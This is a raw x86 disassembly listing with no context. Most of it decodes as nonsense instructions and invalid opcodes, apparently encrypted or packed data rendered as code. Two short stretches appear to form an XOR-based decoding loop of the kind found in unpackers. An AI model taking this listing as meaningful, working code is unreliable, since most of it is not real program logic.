  4059dd:	jp     0x405998
  4059df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4059e0:	push   0xdb07360d
  4059e5:	mov    eax,0x150036e0
  4059ea:	mov    ch,0x2
  4059ec:	ror    BYTE PTR [ebp-0x7a],cl
  4059ef:	fmul   st,st(3)
  4059f1:	imul   ecx,edi,0x21
  4059f4:	imul   edi,DWORD PTR [ebp-0x5d],0xffffff88
  4059f8:	dec    esp
  4059f9:	adc    BYTE PTR [edx-0x17],dh
  4059fc:	xor    al,0x54
  4059fe:	add    ch,BYTE PTR [edi+0x7db6f7a7]
  405a04:	jmp    0x4059be
  405a06:	pop    ss
  405a07:	mov    ebp,0xa3d0a428
  405a0c:	test   BYTE PTR [esi-0x61],0x64
  405a10:	pop    ebp
  405a11:	and    DWORD PTR [ecx],edx
  405a13:	sbb    al,BYTE PTR [edx-0x23482953]
  405a19:	and    eax,0xd833f20f
  405a1e:	sub    eax,0x9b46d989
  405a23:	inc    esp
  405a24:	jmp    0xcf70e88
  405a29:	mov    ch,0xdd
  405a2b:	mov    ebx,0xef4059ed
  405a30:	cmp    DWORD PTR [ebp+0x10f6d03c],edi
  405a36:	stos   BYTE PTR es:[edi],al
  405a37:	bnd jae 0x4059e4
  405a3a:	sub    BYTE PTR [ecx+0x2c],bh
  405a3d:	jp     0x405a2a
  405a3f:	xchg   ch,dh
  405a41:	mov    edx,0x9b38108c
  405a46:	mov    esi,DWORD PTR [esi+0x77]
  405a49:	mov    eax,0xe657a9e0
  405a4e:	dec    edi
  405a4f:	repnz or cl,bh
  405a52:	dec    ecx
  405a53:	int    0x69
  405a55:	ins    BYTE PTR es:[edi],dx
  405a56:	sub    ch,BYTE PTR [esi+0x5ae678f7]
  405a5c:	addr16 push ebp
  405a5e:	ins    BYTE PTR es:[edi],dx
  405a5f:	iret   
  405a60:	test   BYTE PTR [ebx-0x41],ch
  405a63:	idiv   edi
  405a65:	adc    ebp,ecx
  405a67:	dec    ebp
  405a68:	call   0x6487:0xa81ba6f0
  405a6f:	(bad)  
  405a70:	push   edx
  405a71:	cmp    BYTE PTR [edi],bh
  405a73:	fsub   QWORD PTR [ebx-0x50]
  405a76:	mov    cx,0x4ccf
  405a7a:	das    
  405a7b:	pushf  
  405a7c:	jp     0x405a4f
  405a7e:	mov    edx,DWORD PTR [edx-0x1010d5e8]
  405a84:	xchg   ebx,eax
  405a85:	outs   dx,DWORD PTR ds:[si]
  405a87:	bound  ecx,QWORD PTR [ebp+0x5d]
  405a8a:	mov    cl,0x7b
  405a8c:	add    al,0xf6
  405a8e:	mov    eax,ds:0xba1f03a6
  405a93:	push   ds
  405a94:	inc    esp
  405a95:	fwait
  405a96:	mov    edx,0x2ec041f0
  405a9b:	(bad)  
  405a9c:	mov    es,WORD PTR [edi+0x775c211f]
  405aa2:	mov    al,ds:0xd5b962df
  405aa7:	sbb    ch,BYTE PTR [esi]
  405aa9:	sub    al,0x36
  405aab:	xchg   edi,eax
  405aac:	and    bl,dh
  405aae:	mov    esp,0xea45d340
  405ab3:	sbb    eax,0x784cca93
  405ab8:	add    BYTE PTR ss:[eax-0x6ddeff4b],bh
  405abf:	(bad)  
  405ac0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405ac1:	mov    dh,0xf3
  405ac3:	int3   
  405ac4:	or     BYTE PTR ds:0x6f6b3960,0x2c
  405acb:	xchg   ebp,eax
  405acc:	and    ebx,DWORD PTR ds:0x90dcc3b
  405ad2:	and    ebp,esp
  405ad4:	inc    ebp
  405ad5:	test   BYTE PTR [ecx-0x7ee9bf8d],0xb1
  405adc:	sbb    esp,DWORD PTR [edi+0x6]
  405adf:	xor    eax,0x5febc361
  405ae4:	xchg   esp,eax
  405ae5:	xor    DWORD PTR [ecx-0x716ec3c7],edx
  405aeb:	imul   edx,DWORD PTR [edx],0x2279fff8
  405af1:	and    eax,0x30c1bd52
  405af6:	pop    ebx
  405af7:	shr    DWORD PTR [ebx+0x58],0x46
  405afb:	lahf   
  405afc:	into   
  405afd:	out    0xd7,al
  405aff:	lods   eax,DWORD PTR ds:[esi]
  405b00:	out    dx,eax
  405b01:	adc    ebx,edx
  405b03:	sub    al,0xde
  405b05:	into   
  405b06:	fstp   TBYTE PTR [ecx]
  405b08:	cmp    bh,BYTE PTR [edi-0x66]
  405b0b:	pop    ds
  405b0c:	sub    BYTE PTR [edx-0x46],dh
  405b0f:	add    DWORD PTR [eax],0x4eeecd46
  405b15:	scas   al,BYTE PTR es:[edi]
  405b16:	gs or  eax,0xd3a8075c
  405b1c:	ret    
  405b1d:	fdivrp st(0),st
  405b1f:	adc    bl,0x46
  405b22:	imul   ecx,DWORD PTR [edi+0x766e307e],0x3f
  405b29:	or     al,0x97
  405b2b:	mov    dh,0x6a
  405b2d:	add    edx,DWORD PTR [ebp-0x37dd85e]
  405b33:	mov    fs,eax
  405b35:	cmp    al,0x13
  405b37:	stos   BYTE PTR es:[edi],al
  405b38:	mov    eax,0x9e091f6d
  405b3d:	iret   
  405b3e:	fcomp  DWORD PTR [ecx]
  405b40:	mov    bl,0x8b
  405b42:	jmp    0x9bc2:0x5d5efa64
  405b49:	jmp    0xf219:0x1e6def25
  405b50:	cwde   
  405b51:	push   edx
  405b52:	or     bh,ch
  405b54:	nop
  405b55:	aam    0xd7
  405b57:	inc    ebp
  405b58:	or     edx,edx
  405b5a:	pop    ebp
  405b5b:	je     0x405bb8
  405b5d:	push   ds
  405b5e:	mov    DWORD PTR [ebp-0xa],ebx
  405b61:	or     dh,BYTE PTR [ebx-0x73]
  405b64:	in     al,dx
  405b65:	fcomip st,st(6)
  405b67:	mov    cl,0xd8
  405b69:	push   0xffffffe8
  405b6b:	in     eax,dx
  405b6c:	mov    ebx,0xb565c4b3
  405b71:	sbb    DWORD PTR [edi-0x42],ecx
  405b74:	sti    
  405b75:	add    edx,DWORD PTR [ebx]
  405b77:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405b78:	aaa    
  405b79:	mov    eax,ds:0xa7a79bc5
  405b7e:	nop
  405b7f:	nop
  405b80:	out    dx,al
  405b81:	test   eax,0x53f6cf8c
  405b86:	jmp    0xc859bc1d
  405b8b:	cmp    BYTE PTR [ebx+ecx*2],ah
  405b8e:	loop   0x405b54
  405b90:	inc    esp
  405b91:	push   0xffffffc0
  405b93:	jl     0x405c03
  405b95:	pop    ss
  405b96:	ins    DWORD PTR es:[edi],dx
  405b97:	rol    DWORD PTR [edi-0x7ba743bd],cl
  405b9d:	iret   
  405b9e:	xchg   ecx,eax
  405b9f:	dec    ebx
  405ba0:	or     eax,0xd29e2ecd
  405ba5:	and    BYTE PTR [edi-0x54],ah
  405ba8:	xchg   ebx,eax
  405ba9:	cmp    bh,BYTE PTR [ebx-0x66f313d4]
  405baf:	fistp  QWORD PTR [ebx]
  405bb1:	data16 jecxz 0x405bc5
  405bb4:	dec    ebx
  405bb5:	sbb    al,BYTE PTR [eax+0x1f832836]
  405bbb:	or     esi,esi
  405bbd:	repz sti 
  405bbf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405bc0:	pusha  
  405bc1:	sbb    cl,BYTE PTR [edi-0x2719830b]
  405bc7:	aam    0xe4
  405bc9:	(bad)
  405bcc:	fs dec edx
  405bce:	cmp    edi,DWORD PTR [edi]
  405bd0:	lods   eax,DWORD PTR ds:[esi]
  405bd1:	scas   eax,DWORD PTR es:[edi]
  405bd2:	sbb    BYTE PTR [eax+0x46],cl
  405bd5:	sbb    dh,dl
  405bd7:	dec    ecx
  405bd8:	pop    edx
  405bd9:	(bad)  
  405bda:	jmp    0x4a64:0x60e7cd3d
  405be1:	adc    BYTE PTR [esi-0x76d483ce],bl
  405be7:	je     0x405c52
  405be9:	pop    ecx
  405bea:	jmp    0x405c36
  405bec:	pop    ds
  405bed:	ret    
  405bee:	fld    QWORD PTR [esi*2+0xdf36b00]
  405bf5:	jo     0x405c3d
  405bf7:	dec    edx
  405bf8:	adc    DWORD PTR [esi+ebp*4],ecx
  405bfb:	in     al,0xf8
  405bfd:	stc    
  405bfe:	out    0xc3,eax
  405c00:	aas    
  405c01:	push   ebp
  405c02:	or     edi,DWORD PTR [esi]
  405c04:	in     al,dx
  405c05:	leave  
  405c06:	jne    0x405bb1
  405c08:	xor    al,0xbc
  405c0a:	test   eax,0xbfca2734
  405c0f:	sub    edi,eax
  405c11:	add    edi,DWORD PTR [ebp+0x10]
  405c14:	xor    edx,ecx
  405c16:	add    edx,esi
  405c18:	cmp    edx,edi
  405c1a:	ja     0x406428
  405c20:	push   ebx
  405c21:	jmp    0x405c2b
  405c26:	mov    esi,0x32729d
  405c2b:	mov    eax,DWORD PTR [ebp-0x8]
  405c2e:	mov    edi,DWORD PTR [ebp-0x4]
  405c31:	xor    edi,ecx
  405c33:	jmp    0x40600f
  405c38:	test   DWORD PTR [edx-0x7c],0x79ec5dea
  405c3f:	arpl   WORD PTR ds:0x685d0ed0,dx
  405c45:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405c46:	std    
  405c47:	imul   edx,DWORD PTR [eax+0x3b],0x7e
  405c4b:	jle    0x405c0a
  405c4d:	jno    0x405ccd
  405c4f:	jle    0x405c90
  405c51:	mov    esi,0x97d5d5ba
  405c56:	iret   
  405c57:	jne    0x405c93
  405c59:	xchg   ebx,ebp
  405c5b:	mov    ah,0x3d
  405c5d:	fstp   QWORD PTR [ecx]
  405c5f:	je     0x405c06
  405c61:	nop
  405c62:	rol    ecx,1
  405c64:	lods   al,BYTE PTR ds:[esi]
  405c65:	push   0x4d57778f
  405c6a:	mov    ds:0xe409fa43,eax
  405c6f:	jmp    0xafd2b4c4
  405c74:	mov    ch,0xf
  405c76:	out    dx,al
  405c77:	fwait
  405c78:	or     cl,bl
  405c7a:	mov    ds:0xf685da18,al
  405c7f:	test   DWORD PTR [eax+0x77],0xfe9faa37
  405c86:	cmp    al,0xbd
  405c88:	and    DWORD PTR [eax+0x66254540],0x1c
  405c8f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405c90:	jmp    0x5d8a:0x3cadf853
  405c97:	dec    ebp
  405c98:	mov    edx,DWORD PTR [edx]
  405c9a:	xor    BYTE PTR [eax],cl
  405c9c:	push   cs
  405c9d:	mov    bh,0xa5
  405c9f:	aam    0x69
  405ca1:	mov    al,ds:0x42b669d6
  405ca6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405ca7:	in     al,0xe3
  405ca9:	in     al,dx
  405caa:	dec    eax
  405cab:	add    esp,edi
  405cad:	push   edi
  405cae:	mov    edx,0x54e402bb
  405cb3:	fcomp  QWORD PTR [ebx+0x66]
  405cb6:	mov    ?,esp
  405cb8:	or     BYTE PTR [esi+ecx*4+0x3e],0x16
  405cbd:	jne    0x405d38
  405cbf:	mov    ecx,0xf3682595
  405cc4:	jb     0x405cf7
  405cc6:	mov    ebp,0x62c4c5e4
  405ccb:	psadbw mm5,QWORD PTR [edi-0x73]
  405ccf:	mov    eax,DWORD PTR [ebp-0x73a9be9a]
  405cd5:	fcmovnu st,st(0)
  405cd7:	mov    ecx,0xc92fd365
  405cdc:	(bad)  
  405cdd:	fist   WORD PTR [esi+ecx*2]
  405ce0:	lods   eax,DWORD PTR ds:[esi]
  405ce1:	ss pop esp
  405ce3:	stc    
  405ce4:	fisub  WORD PTR [eax]
  405ce6:	jb     0x405d31
  405ce8:	mov    esi,ecx
  405cea:	inc    edx
  405ceb:	adc    ah,BYTE PTR [edi-0x29ab13be]
  405cf1:	call   0x2936a195
  405cf6:	rcr    dh,1
  405cf8:	add    ah,BYTE PTR [ecx]
  405cfa:	dec    edi
  405cfb:	stos   BYTE PTR es:[edi],al
  405cfc:	test   al,0x6f
  405cfe:	jecxz  0x405d2f
  405d00:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405d01:	adc    DWORD PTR ds:0x3d3f14de,ebp
  405d07:	sub    BYTE PTR [esi+edx*1],ch
  405d0a:	mov    ds:0x2de20d22,eax
  405d0f:	icebp  
  405d10:	pop    es
  405d11:	mov    edx,0x2052132a
  405d16:	gs (bad) 
  405d18:	mov    al,ds:0x2fa3f016
  405d1d:	xor    DWORD PTR [esi+eiz*4],edi
  405d20:	dec    edx
  405d21:	xchg   ecx,eax
  405d22:	cmp    al,0x84
  405d24:	mov    ecx,0x6e91ae95
  405d29:	mov    dh,dh
  405d2b:	ret    
  405d2c:	sahf   
  405d2d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405d2e:	jns    0x405cfa
  405d30:	cmp    dh,BYTE PTR [ecx+0x27]
  405d33:	mov    edx,0x354070d
  405d38:	or     eax,0x56465794
  405d3d:	loope  0x405d19
  405d3f:	or     BYTE PTR [ebx+edx*8+0x2df8050],dh
  405d46:	adc    eax,0x5b4cce29
  405d4b:	leave  
  405d4c:	pop    ecx
  405d4d:	lods   eax,DWORD PTR ds:[esi]
  405d4e:	push   ecx
  405d4f:	cwde   
  405d50:	imul   eax,DWORD PTR [eax],0x5e
  405d53:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405d54:	loop   0x405dce
  405d56:	stc    
  405d57:	sub    bl,al
  405d59:	cmp    eax,0x6fff8ca4
  405d5e:	jmp    0x405d2a
  405d60:	and    eax,0xcb49f9bb
  405d65:	loope  0x405d82
  405d67:	pop    edx
  405d68:	inc    esi
  405d69:	xlat   BYTE PTR ds:[ebx]
  405d6a:	ins    BYTE PTR es:[edi],dx
  405d6b:	rol    edi,1
  405d6d:	and    eax,0x7f4ee8aa
  405d72:	aad    0xff
  405d74:	jl     0x405dd0
  405d76:	in     al,dx
  405d77:	loopne 0x405d48
  405d79:	mov    dl,BYTE PTR [ebp+0x705306af]
  405d7f:	stos   BYTE PTR es:[edi],al
  405d80:	fwait
  405d81:	sbb    eax,0x4d4be7e
  405d86:	mov    DWORD PTR [eax-0x1d],esi
  405d89:	mov    dl,0x62
  405d8b:	das    
  405d8c:	stos   BYTE PTR es:[edi],al
  405d8d:	ficomp DWORD PTR [ecx+0x6bf3fbc8]
  405d94:	lock psubsw mm1,QWORD PTR [esi-0x6bc5c33]
  405d9c:	push   esp
  405d9d:	fsubr  st,st(0)
  405d9f:	mov    ah,0x9
  405da1:	pop    esp
  405da2:	xor    eax,0x92b8bcd0
  405da7:	jg     0x405e23
  405da9:	cli    
  405daa:	in     al,0x53
  405dac:	enter  0xfb31,0x86
  405db0:	pop    edi
  405db1:	mov    dl,0x96
  405db3:	out    dx,al
  405db4:	stos   DWORD PTR es:[edi],eax
  405db5:	or     al,0xd9
  405db7:	mov    bh,BYTE PTR [esi-0x64]
  405dba:	mov    cl,0xeb
  405dbc:	or     bl,al
  405dbe:	in     al,dx
  405dbf:	ret    
  405dc0:	push   eax
  405dc1:	mov    ebp,0x4e4a309a
  405dc6:	xchg   esi,eax
  405dc7:	ret    
  405dc8:	cmp    al,0x11
  405dca:	retf   
  405dcb:	push   ecx
  405dcc:	jle    0x405d8e
  405dce:	push   ebp
  405dcf:	xor    al,0xd5
  405dd1:	cmp    eax,0x9f94871f
  405dd6:	adc    al,0x29
  405dd8:	daa    
  405dd9:	iret   
  405dda:	dec    ebp
  405ddb:	(bad)  
  405ddd:	or     dh,ch
  405ddf:	aas    
  405de0:	cmp    ch,BYTE PTR [ebp-0x60834ae8]
  405de6:	(bad)  
  405de7:	pop    ds
  405de8:	lods   eax,DWORD PTR ds:[esi]
  405de9:	jbe    0x405ded
  405deb:	add    bh,bh
  405ded:	jmp    0x405dcf
  405def:	(bad)  
  405df0:	sub    dl,bh
  405df2:	xchg   ebx,eax
  405df3:	adc    DWORD PTR [esi+0x28],ecx
  405df6:	int3   
  405df7:	jnp    0x405e54
  405df9:	sbb    ecx,DWORD PTR [edi]
  405dfb:	fld    TBYTE PTR [ebx]
  405dfd:	pop    ds
  405dfe:	aam    0x7
  405e00:	jge    0x405d94
  405e02:	mov    al,ds:0xee7fd10f
  405e07:	(bad)  
  405e08:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405e09:	outs   dx,DWORD PTR ds:[esi]
  405e0b:	je     0x405df6
  405e0d:	mov    cl,0x6b
  405e10:	sbb    BYTE PTR [ecx],ah
  405e12:	cdq    
  405e13:	pop    esp
  405e14:	jle    0x405dfc
  405e16:	jno    0x405e6d
  405e18:	mov    edi,0x85c18579
  405e1d:	(bad)  
  405e1e:	mov    esp,0x40265d28
  405e23:	add    ecx,0x7b883091
  405e29:	(bad)  
  405e2a:	scas   al,BYTE PTR es:[edi]
  405e2b:	mov    dl,0x8f
  405e2d:	std    
  405e2e:	cmp    BYTE PTR [edi+0x59],dh
  405e31:	mov    ds:0xc6945ee1,eax
  405e36:	pushf  
  405e37:	out    0x46,eax
  405e39:	inc    ecx
  405e3a:	inc    esi
  405e3b:	sub    esi,DWORD PTR [esi+0x7]
  405e3e:	sub    esp,DWORD PTR [ecx+eax*8-0xf]
  405e42:	call   0x8671:0x3e9d6166
  405e49:	mov    ecx,esp
  405e4b:	mov    al,0x5d
  405e4d:	pop    ecx
  405e4e:	jp     0x405e97
  405e50:	add    al,0xa6
  405e52:	cli    
  405e53:	fsub   st(7),st
  405e55:	xchg   ecx,eax
  405e56:	push   ss
  405e57:	pop    ebx
  405e58:	dec    ebp
  405e5a:	iret   
  405e5b:	pop    ds
  405e5c:	push   edx
  405e5d:	mov    esp,0x6f9d820e
  405e62:	popf   
  405e63:	pusha  
  405e64:	pop    edx
  405e65:	push   ebx
  405e66:	data16 mov bh,0xc9
  405e69:	mov    dl,0x8c
  405e6b:	push   ss
  405e6c:	jl     0x405e42
  405e6e:	into   
  405e6f:	(bad)  
  405e70:	xor    DWORD PTR [ecx+0x2ebb1ec5],ebx
  405e76:	mov    eax,ds:0x7892903f
  405e7b:	xor    al,0x4b
  405e7d:	arpl   WORD PTR [esp+edx*8],cx
  405e80:	sub    esp,edi
  405e82:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405e83:	mov    ds:0x2ada6be8,eax
  405e88:	add    bh,bh
  405e8a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405e8b:	jge    0x405e39
  405e8d:	push   ds
  405e8e:	rcr    BYTE PTR [ecx],1
  405e90:	mov    dl,0x69
  405e92:	rcl    eax,0x1f
  405e95:	js     0x405ed1
  405e97:	sub    edx,edx
  405e99:	sub    al,0xd3
  405e9b:	inc    esp
  405e9c:	mov    esi,esi
  405e9e:	jbe    0x405f1c
  405ea0:	scas   eax,DWORD PTR es:[edi]
  405ea1:	lods   al,BYTE PTR ds:[esi]
  405ea2:	xor    edi,DWORD PTR ds:0xe9dc0fd0
  405ea8:	add    BYTE PTR [ecx],dl
  405eaa:	(bad)  
  405eab:	jnp    0x405f1c
  405ead:	cs jmp 0xde6b:0xd3d38d5e
  405eb5:	mov    ds:0x77963ec5,eax
  405eba:	xchg   ecx,eax
  405ebb:	test   DWORD PTR [edi-0x5dff8c3c],0x7a9b5c20
  405ec5:	inc    esp
  405ec6:	sbb    DWORD PTR [ecx-0x3aab2cd8],0xffffff83
  405ecd:	ret    
  405ece:	jle    0x405eff
  405ed0:	je     0x405e75
  405ed2:	jmp    0x2f58:0x676b1b25
  405ed9:	addr16 std 
  405edb:	lahf   
  405edc:	leave  
  405edd:	loopne 0x405ee9
  405edf:	xor    BYTE PTR [edx+0x59825c73],bh
  405ee5:	(bad)  
  405ee6:	stos   BYTE PTR es:[edi],al
  405ee7:	or     BYTE PTR [edi+0x39],bh
  405eea:	cwde   
  405eeb:	gs xchg esi,eax
  405eed:	scas   eax,DWORD PTR es:[edi]
  405eee:	sar    eax,1
  405ef0:	cdq    
  405ef1:	out    dx,eax
  405ef2:	call   0xd2f:0xcd89823c
  405ef9:	cli    
  405efa:	test   eax,0x7617390a
  405eff:	adc    al,0xca
  405f01:	or     BYTE PTR [ecx-0x76a27e0e],dh
  405f07:	mov    al,ds:0xfc7eff77
  405f0c:	push   eax
  405f0d:	pop    edi
  405f0e:	in     al,0x79
  405f10:	enter  0x15d7,0xf3
  405f14:	dec    esi
  405f15:	jno    0x405f8f
  405f17:	mov    dh,bh
  405f19:	inc    ebx
  405f1a:	xchg   esi,eax
  405f1b:	push   ebp
  405f1c:	and    ebp,esp
  405f1e:	test   BYTE PTR [edx-0x2fd0fdd7],dl
  405f24:	mov    dh,0x19
  405f26:	pop    eax
  405f27:	mov    al,ds:0xa86f9fa1
  405f2c:	ficom  WORD PTR [ebp-0x2a37b863]
  405f32:	lock mov eax,ds:0x8c1959e9
  405f38:	mov    ebx,esp
  405f3a:	gs push ss
  405f3c:	jb     0x405f54
  405f3e:	pop    ebp
  405f3f:	int3   
  405f40:	jno    0x405ed7
  405f42:	cwde   
  405f43:	fnstcw WORD PTR [ebp-0x37f86cc]
  405f49:	es xchg ebx,eax
  405f4b:	mov    ds:0x63f7fce6,al
  405f50:	cdq    
  405f51:	repnz ins BYTE PTR es:[di],dx
  405f54:	scas   eax,DWORD PTR es:[edi]
  405f55:	mov    cl,0x42
  405f57:	xchg   ecx,eax
  405f58:	sub    BYTE PTR [edx+0x499c6158],cl
  405f5e:	aas    
  405f5f:	xor    al,0x52
  405f61:	add    eax,0x6bed5a09
  405f66:	enter  0x985a,0xb
  405f6a:	loope  0x405fac
  405f6c:	pusha  
  405f6d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405f6e:	dec    esi
  405f6f:	xchg   esi,eax
  405f70:	dec    edi
  405f71:	retf   0xf621
  405f74:	in     al,dx
  405f75:	sub    eax,0x7619e376
  405f7a:	jmp    0xce5f4142
  405f7f:	div    DWORD PTR [esi+eax*8-0x7563539c]
  405f86:	shl    ebp,cl
  405f88:	ret    
  405f89:	adc    al,0x3d
  405f8b:	cmp    esp,edx
  405f8d:	dec    ecx
  405f8e:	push   eax
  405f8f:	push   ebp
  405f90:	xor    eax,0x43ef593d
  405f95:	jbe    0x405f63
  405f97:	mov    ah,0x33
  405f99:	fld    TBYTE PTR [ecx-0x2d]
  405f9c:	cwde   
  405f9d:	push   cs
  405f9e:	loopne 0x405f76
  405fa0:	ss out dx,al
  405fa2:	cmp    BYTE PTR [ecx-0x7],0x5b
  405fa6:	pop    ss
  405fa7:	jmp    0x406006
  405fa9:	ret    
  405faa:	inc    edi
  405fab:	call   0x812c3b45
  405fb0:	push   ds
  405fb1:	sbb    bh,al
  405fb3:	xor    ah,BYTE PTR [esi+eax*8-0x440fe9fa]
  405fba:	inc    edi
  405fbc:	adc    DWORD PTR [edx+0x71d6a380],0xf30e0aa
  405fc6:	push   esp
  405fc7:	fld    QWORD PTR ds:0xee6a02b5
  405fcd:	std    
  405fce:	or     ebx,DWORD PTR [esi]
  405fd0:	mov    bh,0xe3
  405fd2:	leave  
  405fd3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405fd4:	or     BYTE PTR [ecx],ah
  405fd6:	push   DWORD PTR [edx]
  405fd8:	pop    ss
  405fd9:	pop    ds
  405fda:	mov    BYTE PTR [ebx+0x31f3c270],dh
  405fe0:	mov    bh,0x59
  405fe2:	fs int3 
  405fe4:	mov    ebx,0x8eb0185
  405fe9:	xor    bl,BYTE PTR [eax+0x325b3160]
  405fef:	out    0x7,al
  405ff1:	imul   edi,ecx,0xa
  405ff4:	aam    0x94
  405ff6:	test   eax,0x124f2ea6
  405ffb:	and    al,0x51
  405ffd:	sub    esi,ebx
  405fff:	and    DWORD PTR [edx],esp
  406001:	stc    
  406002:	aad    0x4d
  406004:	jg     0x40606e
  406006:	ja     0x405fdd
  406008:	bound  esi,QWORD PTR [ecx-0x351018cc]
  40600e:	bound  eax,QWORD PTR [ebx]
  406010:	dec    BYTE PTR [ebx-0x50f0f78b]
  406016:	cli    
  406017:	mov    ebx,DWORD PTR [ebp+0xc]
  40601a:	xor    eax,ecx
  40601c:	add    eax,edx
  40601e:	mov    al,BYTE PTR [ebx+eax*1+0x32729d]
  406025:	mov    BYTE PTR [edi+esi*1],al
  406028:	mov    eax,DWORD PTR [ebp-0x4]
  40602b:	xor    eax,ecx
  40602d:	lea    edx,[edx+eax*1+0x32729d]
  406034:	mov    eax,DWORD PTR [ebp-0x4]
  406037:	xor    eax,ecx
  406039:	mov    esi,0xffcd8d63
  40603e:	sub    esi,eax
  406040:	add    esi,DWORD PTR [ebp+0x10]
  406043:	cmp    edx,esi
  406045:	jmp    0x406421
  40604a:	fdivr  st(7),st
  40604c:	es fwait
  40604e:	jge    0x40600b
  406050:	jge    0x40609b
  406052:	jae    0x4060cf
  406054:	dec    edx
  406055:	pusha  
  406056:	fbstp  TBYTE PTR [esi]
  406058:	les    esp,FWORD PTR [edi+ebx*4+0x3f]
  40605c:	jle    0x4060dc
  40605e:	mov    ebp,0x577e7e71
  406063:	je     0x4060a8
  406065:	lods   eax,DWORD PTR ds:[esi]
  406066:	pop    ds
  406067:	mov    esp,esp
  406069:	(bad)  
  40606a:	in     al,0x22
  40606c:	xor    dh,BYTE PTR [esi-0x59c13871]
  406072:	fnstcw WORD PTR [ebp+0x19]
  406075:	and    eax,0xe3ab59f8
  40607a:	xor    ebx,DWORD PTR [ecx]
  40607c:	ret    
  40607d:	pop    ebx
  40607e:	(bad)  
  40607f:	sti    
  406080:	stos   DWORD PTR es:[edi],eax
  406081:	and    al,ah
  406083:	lea    ecx,[esi+0xa]
  406086:	push   ss
  406087:	adc    ebx,DWORD PTR [esi]
  406089:	stc    
  40608a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40608b:	mov    eax,0xa86064db
  406090:	mov    ah,0x9c
  406092:	push   esi
  406093:	mov    ?,ebp
  406095:	pop    esp
  406096:	cwde   
  406097:	push   es
  406098:	and    BYTE PTR [esi],dh
  40609a:	xsavec [ebp-0x6fa40447]
  4060a1:	jnp    0x406045
  4060a3:	push   ds
  4060a4:	and    ah,0xd
  4060a7:	xchg   ebp,eax
  4060a8:	push   0x60
  4060aa:	mov    bh,0x1d
  4060ac:	adc    ebx,DWORD PTR [edx]
  4060ae:	loope  0x4060e8
  4060b0:	mov    esi,0xf1520cb4
  4060b5:	arpl   WORD PTR [ebx-0xc6f87a1],di
  4060bb:	cmp    al,0x29
  4060bd:	es push ebp
  4060bf:	pop    edx
  4060c0:	cmc    
  4060c1:	shr    esi,1
  4060c3:	and    DWORD PTR [edi-0x370ee548],ebx
  4060c9:	je     0x4060ed
  4060cb:	das    
  4060cc:	push   eax
  4060cd:	cli    
  4060ce:	ins    BYTE PTR es:[edi],dx
  4060cf:	push   es
  4060d0:	pushf  
  4060d1:	cdq    
  4060d2:	ss jle 0x406112
  4060d5:	das    
  4060d6:	or     al,0xd3
  4060d8:	push   es
  4060d9:	ja     0x406091
  4060db:	aad    0x7f
  4060dd:	add    ebp,DWORD PTR [esi]
  4060df:	mov    DWORD PTR [esi],0x498881fe
  4060e5:	mov    fs,WORD PTR [eax+0x63]
  4060e8:	dec    ebx
  4060e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4060ea:	aas    
  4060eb:	and    BYTE PTR [ecx-0x1d],bl
  4060ee:	add    BYTE PTR [esi-0x147ad73b],bl
  4060f4:	xor    DWORD PTR [eax-0x7f],ebp
  4060f7:	(bad)  
  4060f8:	shl    DWORD PTR [edx+0x3],cl
  4060fb:	mov    edi,0xd52b3106
  406100:	pop    ecx
  406101:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406102:	pop    esp
  406103:	lock ins DWORD PTR es:[edi],dx
  406105:	push   0x8afc02fd
  40610a:	bound  ebp,QWORD PTR [ebx+0x6862e331]
  406110:	das    
  406111:	(bad)  
  406112:	lock cmp eax,0xad6b1fdc
  406118:	ror    eax,cl
  40611a:	stc    
  40611b:	sub    ch,al
  40611d:	ins    BYTE PTR es:[edi],dx
  40611e:	ins    DWORD PTR es:[edi],dx
  40611f:	xchg   edx,eax
  406120:	jbe    0x406105
  406122:	mov    al,0xa6
  406124:	push   0xffffffeb
  406126:	mov    ds,WORD PTR [edx-0x18]
  406129:	sahf   
  40612a:	and    DWORD PTR [ecx-0x80],edi
  40612d:	mov    WORD PTR [ecx],gs
  40612f:	hlt    
  406130:	hlt    
  406131:	loopne 0x4060ff
  406133:	push   DWORD PTR [eax+edx*1]
  406136:	and    eax,0x5b57317a
  40613b:	cmp    dh,BYTE PTR [ebx]
  40613d:	int3   
  40613e:	add    eax,0xe972239a
  406143:	sbb    esi,ebp
  406145:	cmp    eax,0x9e04e1dd
  40614a:	sub    ebp,DWORD PTR [edi+0x2]
  40614d:	mov    dh,0x90
  40614f:	cmp    al,0x4
  406151:	int    0x8a
  406153:	mov    esi,0x6216ebf6
  406158:	jecxz  0x40612b
  40615a:	cs aaa 
  40615c:	xor    DWORD PTR [ebx-0x683c30aa],edi
  406162:	xchg   ebp,eax
  406163:	jo     0x406198
  406165:	xor    eax,0x67f758a3
  40616a:	ins    BYTE PTR es:[edi],dx
  40616b:	shl    BYTE PTR [ebx-0x3f686f99],1
  406171:	arpl   WORD PTR [ecx+ebp*8],dx
  406174:	out    dx,al
  406175:	adc    al,0x3a
  406177:	ins    BYTE PTR es:[edi],dx
  406178:	mov    esp,0x8313b453
  40617d:	jg     0x4061f2
  40617f:	fwait
  406180:	jnp    0x4061c1
  406182:	rol    DWORD PTR [edi*4-0x45e1af7a],1
  406189:	loopne 0x406150
  40618b:	dec    edx
  40618c:	inc    esi
  40618d:	push   edi
  40618e:	ss mov ebp,ebp
  406191:	jp     0x406167
  406193:	addr16 sti 
  406195:	int3   
  406196:	push   es
  406197:	push   ebx
  406198:	mov    ecx,0x2cefd0cd
  40619d:	std    
  40619e:	pop    edi
  40619f:	pop    ebp
  4061a0:	dec    esi
